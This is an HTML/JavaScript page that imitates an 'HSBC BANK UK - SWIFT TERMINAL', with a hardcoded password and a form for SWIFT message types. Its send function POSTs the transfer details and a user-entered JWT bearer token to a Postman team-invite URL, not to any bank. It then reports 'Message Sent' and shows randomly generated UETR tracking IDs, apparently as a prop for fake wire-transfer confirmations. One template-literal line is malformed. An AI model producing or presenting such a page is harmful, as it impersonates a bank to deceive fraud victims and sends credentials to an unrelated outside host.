<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <title>HSBC SWIFT TERMINAL</title>
  <style>
    body {
      background-color: black;
      color: #00FF00;
      font-family: monospace;
      padding: 20px;
    }
    input, select, button, textarea {
      background: black;
      color: #00FF00;
      border: 1px solid #00FF00;
      padding: 5px;
      margin: 5px 0;
      font-family: monospace;
    }
    #terminal, #formArea, #tracker, #excelBtn {
      display: none;
    }
    .terminal-box {
      border: 1px solid #00FF00;
      padding: 10px;
      height: 300px;
      overflow-y: auto;
    }
  </style>
</head>
<body><h2>HSBC BANK UK - SWIFT TERMINAL</h2>
<input type="password" id="pass" placeholder="Enter Password" />
<button onclick="checkLogin()">Login</button><div id="formArea">
  <select id="type">
    <option value="MT103">MT103</option>
    <option value="MT199">MT199</option>
    <option value="MT799">MT799</option>
    <option value="MT760">MT760</option>
  </select><br>
  Ref: <input id="ref" /><br>
  Sender: <input id="from" /><br>
  Receiver: <input id="to" /><br>
  IBAN: <input id="iban" /><br>
  Amount: <input id="amt" /><br>
  Message: <textarea id="msg"></textarea><br>
  JWT Token: <input id="jwt" /><br>
  <button onclick="sendMsg()">Send SWIFT</button>
</div><div id="tracker">
  Track UETR: <input id="uetr" />
  <button onclick="track()">Track</button>
</div><div class="terminal-box" id="terminal"></div>
<button id="excelBtn" onclick="exportExcel()">Export Excel</button><script src="https://cdn.jsdelivr.net/npm/xlsx/dist/xlsx.full.min.js"></script><script>
  const PASSWORD = "Mohsen115960";
  let history = [];

  function checkLogin() {
    const p = document.getElementById("pass").value;
    if (p === PASSWORD) {
      document.getElementById("formArea").style.display = "block";
      document.getElementById("terminal").style.display = "block";
      document.getElementById("tracker").style.display = "block";
      document.getElementById("excelBtn").style.display = "inline-block";
      document.getElementById("pass").style.display = "none";
      document.querySelector("button").style.display = "none";
    } else {
      alert("Wrong password");
    }
  }

  function generateUETR() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      var r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  function log(text) {
    const box = document.getElementById("terminal");
    box.innerHTML += text + "\n";
    box.scrollTop = box.scrollHeight;
  }

  function sendMsg() {
    const type = document.getElementById("type").value;
    const ref = document.getElementById("ref").value;
    const from = document.getElementById("from").value;
    const to = document.getElementById("to").value;
    const iban = document.getElementById("iban").value;
    const amt = document.getElementById("amt").value;
    const msg = document.getElementById("msg").value;
    const jwt = document.getElementById("jwt").value;
    const uetr = generateUETR();

    const payload = { type, ref, from, to, iban, amt, msg, uetr };
    history.push(payload);

    log(> Sending ${type}...\nRef: ${ref}\nUETR: ${uetr});

    fetch("https://app.getpostman.com/join-team?invite_code=326866cd39f3448091cd38cfe50f4f1613c0e98b430f5336bb45da030394cebc&target_code=0374001f18310f0c4b9d4844073009c9", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": "Bearer " + jwt
      },
      body: JSON.stringify(payload)
    }).then(res => {
      log("> Message Sent.");
      document.getElementById("uetr").value = uetr;
    }).catch(() => {
      log("> ERROR sending message.");
    });
  }

  function track() {
    const uetr = document.getElementById("uetr").value;
    if (!uetr) {
      log("> No UETR to track.");
      return;
    }

    fetch("https://ohmyfin.ai/wire-transfer", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ uetr })
    }).then(r => r.json()).then(data => {
      log("> UETR Status:\n" + JSON.stringify(data));
    }).catch(() => {
      log("> Error tracking UETR.");
    });
  }

  function exportExcel() {
    const ws = XLSX.utils.json_to_sheet(history);
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, ws, "SWIFT History");
    XLSX.writeFile(wb, "swift_history.xlsx");
  }
</script></body>
</html>
